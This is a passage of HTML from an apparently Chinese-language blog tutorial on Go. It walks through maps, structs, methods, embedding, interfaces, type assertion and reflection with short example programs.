class="comment">//分配空间</span></span><br><span class="line">map1[<span class="number">0</span>] = <span class="string">&quot;hello&quot;</span></span><br><span class="line">fmt.Println(map1)</span><br><span class="line"></span><br><span class="line"><span class="comment">//方式二</span></span><br><span class="line">map2 := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">int</span>]<span class="type">string</span>)</span><br><span class="line">map2[<span class="number">0</span>] = <span class="string">&quot;Randolfluo&quot;</span></span><br><span class="line">fmt.Println(map2)</span><br><span class="line"></span><br><span class="line"><span class="comment">//方式三</span></span><br><span class="line">map3 := <span class="keyword">map</span>[<span class="type">int</span>]<span class="type">string</span>&#123;</span><br><span class="line"><span class="number">0</span>: <span class="string">&quot;Randolfluo&quot;</span>,</span><br><span class="line"><span class="number">1</span>: <span class="string">&quot;Hatsune Miku&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(map3)</span><br><span class="line"></span><br><span class="line">map3[<span class="number">2</span>] = <span class="string">&quot;114514&quot;</span> <span class="comment">//添加</span></span><br><span class="line">fmt.Println(map3)</span><br><span class="line"></span><br><span class="line"><span class="built_in">delete</span>(map3, <span class="number">0</span>) <span class="comment">//删除</span></span><br><span class="line">fmt.Println(map3)</span><br><span class="line"></span><br><span class="line">map3[<span class="number">2</span>] = <span class="string">&quot;1919810&quot;</span> <span class="comment">//修改</span></span><br><span class="line">fmt.Println(map3)</span><br><span class="line"></span><br><span class="line"><span class="comment">//map传参属于浅拷贝，引用传递</span></span><br><span class="line">changemap(map3)</span><br><span class="line">fmt.Println(map3)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="type"><a href="#type" class="headerlink" title="type"></a>type</h3><ul><li>定于的类型可以基于已有的类型，但它被视为一个完全不同的类型。</li><li>可以与struct、interface等关键词一起使用定义结构体</li></ul><h3 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h3><p>用于定义结构体</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">package main</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">import</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="string">&quot;fmt&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">type MyInt <span class="type">int</span> <span class="comment">//自定义类型</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">type Person <span class="keyword">struct</span> </span>&#123;</span><br><span class="line">name string</span><br><span class="line">age  <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">func <span class="title">changePerson1</span><span class="params">(p Person)</span> </span>&#123;</span><br><span class="line">p.name = <span class="string">&quot;Hatsune Miku&quot;</span></span><br><span class="line">p.age = <span class="number">16</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//传入指针</span></span><br><span class="line">func <span class="built_in">changePerson2</span>(p *Person) &#123;</span><br><span class="line">p.name = <span class="string">&quot;Hatsune Miku&quot;</span></span><br><span class="line">p.age = <span class="number">16</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func <span class="built_in">main</span>() &#123;</span><br><span class="line">var a MyInt = <span class="number">1</span></span><br><span class="line">fmt.<span class="built_in">Printf</span>(<span class="string">&quot;a = %T\n&quot;</span>, a)</span><br><span class="line"><span class="comment">//变量 a 的类型是 main.MyInt，其中 main 是包名，MyInt 是类型名。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line">var p Person</span><br><span class="line">p.age = <span class="number">20</span></span><br><span class="line">p.name = <span class="string">&quot;Randolfluo&quot;</span></span><br><span class="line">fmt.<span class="built_in">Println</span>(p)</span><br><span class="line"></span><br><span class="line"><span class="comment">//默认深拷贝</span></span><br><span class="line"><span class="built_in">changePerson1</span>(p)</span><br><span class="line">fmt.<span class="built_in">Println</span>(p)</span><br><span class="line"></span><br><span class="line"><span class="comment">//可以传递指针进行浅拷贝，函数修改会影响调用者的数据</span></span><br><span class="line"><span class="built_in">changePerson2</span>(&amp;p) <span class="comment">//传入地址</span></span><br><span class="line">fmt.<span class="built_in">Println</span>(p)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h3><h4 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h4><p>定义一个结构体存储数据（），然后通过公开的方法传入结构体(指针)来访问修改这些字段。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 大写表示该类其他包可以访问</span></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="comment">//如果首字母为大写，则该属性是公有的，否则为私有</span></span><br><span class="line">name <span class="type">string</span></span><br><span class="line">age  <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法大写表示该方法能被其他包访问如，fmt.Println</span></span><br><span class="line"><span class="comment">// 若不加指针，表示传入参数的副本，修改无效</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Person)</span></span> Get() (name <span class="type">string</span>, age <span class="type">int</span>) &#123;</span><br><span class="line">age = p.age</span><br><span class="line">name = p.name</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 若加指针，表示传入参数的地址，修改有效</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Person)</span></span> Set(name <span class="type">string</span>, age <span class="type">int</span>) &#123;</span><br><span class="line">p.name = name</span><br><span class="line">p.age = age</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">p := Person&#123;name: <span class="string">&quot;tom&quot;</span>, age: <span class="number">18</span>&#125;</span><br><span class="line">name, age := p.Get() <span class="comment">//get方法不修改数据，可以传入副本</span></span><br><span class="line">fmt.Println(name, age)</span><br><span class="line">p.Set(<span class="string">&quot;jack&quot;</span>, <span class="number">20</span>) <span class="comment">//set方法修改数据，必须传入地址</span></span><br><span class="line">name, age = p.Get()</span><br><span class="line">fmt.Println(name, age)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><p>组合：组合是一种将一个类型嵌入到另一个类型中的方法，这样内嵌的类型就可以被外部类型使用。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 大写表示该类其他包可以访问</span></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="comment">//如果首字母为大写，则该属性是公有的，否则为私有</span></span><br><span class="line">name <span class="type">string</span></span><br><span class="line">age  <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Person)</span></span> showinfo() (name <span class="type">string</span>, age <span class="type">int</span>) &#123;</span><br><span class="line">name = p.name</span><br><span class="line">age = p.age</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">Person <span class="comment">//继承父类方法</span></span><br><span class="line">school <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类重写父类方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Student)</span></span> showinfo() (name <span class="type">string</span>, age <span class="type">int</span>, school <span class="type">string</span>) &#123;</span><br><span class="line">name = s.name</span><br><span class="line">age = s.age</span><br><span class="line">school = s.school</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//写法一</span></span><br><span class="line"><span class="comment">// p := Person&#123;&quot;Randolfluo&quot;, 20&#125;</span></span><br><span class="line"><span class="comment">// s := Student&#123;p, &quot;zjxu&quot;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//写法二</span></span><br><span class="line"><span class="comment">// s := Student&#123;Person&#123;&quot;Randolfluo&quot;, 20&#125;, &quot;zjxu&quot;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//写法三</span></span><br><span class="line"><span class="keyword">var</span> s Student</span><br><span class="line">s.name = <span class="string">&quot;Randolfluo&quot;</span></span><br><span class="line">s.age = <span class="number">20</span></span><br><span class="line">s.school = <span class="string">&quot;zjxu&quot;</span></span><br><span class="line"></span><br><span class="line">name, age, school := s.showinfo()</span><br><span class="line">fmt.Println(name, age, school)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h4><p><strong>鸭子类型：</strong>一个对象是否符合某个接口，不是由它的类型决定，而是由它实现了哪些方法决定。一个类型只要实现了接口中定义的所有方法，那么这个类型的对象就可以赋值给这个接口类型的变量，而无需显式地声明实现了这个接口。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 Animal 接口</span></span><br><span class="line"><span class="keyword">type</span> Animal <span class="keyword">interface</span> &#123;</span><br><span class="line">Sleep()</span><br><span class="line">GetColor() <span class="type">string</span></span><br><span class="line">Fly()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现 Sleep 方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Cat)</span></span> Sleep() &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Cat sleep&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Bird)</span></span> Sleep() &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Bird sleep&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现 Fly 方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Cat)</span></span> Fly() &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Cat can&#x27;t fly&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Bird)</span></span> Fly() &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Bird flies&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 Cat 结构体</span></span><br><span class="line"><span class="keyword">type</span> Cat <span class="keyword">struct</span> &#123;</span><br><span class="line">Color <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GetColor 方法返回 Cat 的颜色</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Cat)</span></span> GetColor() <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">return</span> c.Color</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 Bird 结构体</span></span><br><span class="line"><span class="keyword">type</span> Bird <span class="keyword">struct</span> &#123;</span><br><span class="line">Color <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// GetColor 方法返回 Bird 的颜色</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Bird)</span></span> GetColor() <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">return</span> b.Color</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不能接收指针</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">showAnimal</span><span class="params">(a Animal)</span></span> &#123;</span><br><span class="line">a.Sleep()</span><br><span class="line">fmt.Println(<span class="string">&quot;Animal color:&quot;</span>, a.GetColor())</span><br><span class="line">a.Fly()</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// // 创建 Cat 实例并调用方法</span></span><br><span class="line"><span class="comment">// cat := &amp;Cat&#123;Color: &quot;Black&quot;&#125;</span></span><br><span class="line"><span class="comment">// fmt.Println(&quot;Cat color:&quot;, cat.GetColor())</span></span><br><span class="line"><span class="comment">// cat.Sleep()</span></span><br><span class="line"><span class="comment">// cat.Fly()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// // 创建 Bird 实例并调用方法</span></span><br><span class="line"><span class="comment">// bird := &amp;Bird&#123;Color: &quot;White&quot;&#125;</span></span><br><span class="line"><span class="comment">// fmt.Println(&quot;Bird color:&quot;, bird.GetColor())</span></span><br><span class="line"><span class="comment">// bird.Sleep()</span></span><br><span class="line"><span class="comment">// bird.Fly()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个 Animal 接口类型的变量 an</span></span><br><span class="line"><span class="keyword">var</span> an Animal      <span class="comment">//定义接口指针</span></span><br><span class="line">an = &amp;Cat&#123;<span class="string">&quot;Black&quot;</span>&#125; <span class="comment">//指向cat实例</span></span><br><span class="line">showAnimal(an)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 直接创建 Cat 和 Bird 实例</span></span><br><span class="line">cat := Cat&#123;Color: <span class="string">&quot;Black&quot;</span>&#125;</span><br><span class="line">bird := Bird&#123;Color: <span class="string">&quot;White&quot;</span>&#125;</span><br><span class="line">showAnimal(&amp;cat)</span><br><span class="line">showAnimal(&amp;bird)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="interface空接口"><a href="#interface空接口" class="headerlink" title="interface空接口"></a>interface空接口</h3><p><code>interface&#123;&#125;</code> 是一个空接口，它表示没有任何方法。由于任何类型都至少实现了零个方法，因此任何类型都实现了空接口 <code>interface&#123;&#125;</code>。这意味着 <code>interface&#123;&#125;</code> 可以被任何类型的值赋值。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Isstring</span><span class="params">(a <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">value, ok := a.(<span class="type">string</span>) <span class="comment">//类型断言</span></span><br><span class="line"><span class="keyword">if</span> ok &#123;</span><br><span class="line">fmt.Println(value, <span class="string">&quot; is string&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Println(a, <span class="string">&quot; is not string&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">Isstring(<span class="number">123</span>)</span><br><span class="line">Isstring(<span class="string">&quot;Randolfluo&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>在Go 1.18及更高版本中，推荐使用 <code>any</code> 来代替 <code>interface&#123;&#125;</code>，特别是在使用泛型时。</p></blockquote><h3 id="pair"><a href="#pair" class="headerlink" title="pair"></a>pair</h3><ul><li><p>在Go中，接口变量实际上是一个包含两个元素的元组（tuple）：一个<strong>类型描述符</strong>和一个指向具体数据的<strong>指针</strong>。</p></li><li><p><code>(interface value) = (type, value)</code></p></li><li><strong>类型断言（type assertion）</strong>是用于将接口类型转换为具体类型或另一个接口类型的一个机制。</li><li>这里的断言实质是<code>类型转换</code>，当pair类型相同时，可以进行转换</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开 /dev/tty 设备文件，以读写模式打开</span></span><br><span class="line"><span class="comment">// tty: pair&lt;type:*os.File, value:&quot;/dev/tty&quot;文件描述符&gt;</span></span><br><span class="line">tty, err := os.OpenFile(<span class="string">&quot;/dev/tty&quot;</span>, os.O_RDWR, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error opening /dev/tty:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span> <span class="comment">// 如果打开失败，打印错误信息并退出</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个 io.Reader 接口类型的变量 r，并将其赋值为 tty</span></span><br><span class="line"><span class="keyword">var</span> r io.Reader</span><br><span class="line"><span class="comment">//r:  pair&lt;type:*os.File, value:&quot;/dev/tty&quot;文件描述符&gt;</span></span><br><span class="line">r = tty <span class="comment">// tty 实现了 io.Reader 接口，因此可以赋值给 r</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个 io.Writer 接口类型的变量 w，并将其赋值为 tty</span></span><br><span class="line"><span class="keyword">var</span> w io.Writer</span><br><span class="line"><span class="comment">// 使用 io.Writer 接口的 Write 方法向 tty 写入数据</span></span><br><span class="line"><span class="comment">//w:  pair&lt;type:*os.File, value:&quot;/dev/tty&quot;文件描述符&gt;</span></span><br><span class="line">w = r.(io.Writer) <span class="comment">// 类型断言，将 r 转换为 io.Writer 接口</span></span><br><span class="line"></span><br><span class="line">w.Write([]<span class="type">byte</span>(<span class="string">&quot;Hello, World!\n&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭 tty 文件</span></span><br><span class="line">err = tty.Close()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error closing /dev/tty:&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="reflect"><a href="#reflect" class="headerlink" title="reflect"></a>reflect</h3><p>Go语言的<code>反射机制</code>允许程序在运行时检查<code>对象的类型和值</code>。</p><ul><li><p><strong>获取类型信息</strong>：可以获取任意值的类型（<code>reflect.Type</code>）。</p></li><li><p><strong>获取值信息</strong>：可以获取和设置任意值的值（<code>reflect.Value</code>）。</p></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;reflect&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Person 定义了一个包含 Name 和 Age 字段的结构体</span></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">Name <span class="type">string</span> <span class="comment">// 姓名</span></span><br><span class="line">Age  <span class="type">int</span>    <span class="comment">// 年龄</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// String 方法返回 Person 结构体的字符串表示</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Person)</span></span> String() <span class="type">string</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;Person: %s %d&quot;</span>, p.Name, p.Age)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 创建一个 Person 实例</span></span><br><span class="line">user := Person&#123;</span><br><span class="line">Name: <span class="string">&quot;Randolfluo&quot;</span>,</span><br><span class="line">Age:  <span class="number">20</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用 DoFieldAndMethod 函数来处理 user 实例</span></span><br><span class="line">DoFieldAndMethod(user)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DoFieldAndMethod 函数使用反射打印输入的字段和方法信息</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">DoFieldAndMethod</span><span class="params">(input <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取输入的类型和实际值</span></span><br><span class="line">inputtype := reflect.TypeOf(input)</span><br><span class="line">inputvalue := reflect.ValueOf(input)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印类型名称和值</span></span><br><span class="line">fmt.Println(<span class="string">&quot;type:&quot;</span>, inputtype.Name(), <span class="string">&quot;value:&quot;</span>, inputvalue)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历字段并打印字段名称、类型和值</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; inputtype.NumField(); i++ &#123;</span><br><span class="line">field := inputtype.Field(i)</span><br><span class="line">value := inputvalue.Field(i).Interface()</span><br><span class="line">fmt.Printf(<span class="string">&quot;%s: %v = %v\n&quot;</span>, field.Name, field.Type, value)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历方法并打印方法名称和签名</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; inputtype.NumMethod(); i++ &#123;</span><br><span class="line">method := inputtype.Method(i)</span><br><span class="line">fmt.Printf(<span class="string">&quot;%s: %v\n&quot;</span>, method.Name, method.Type)</span><br><span 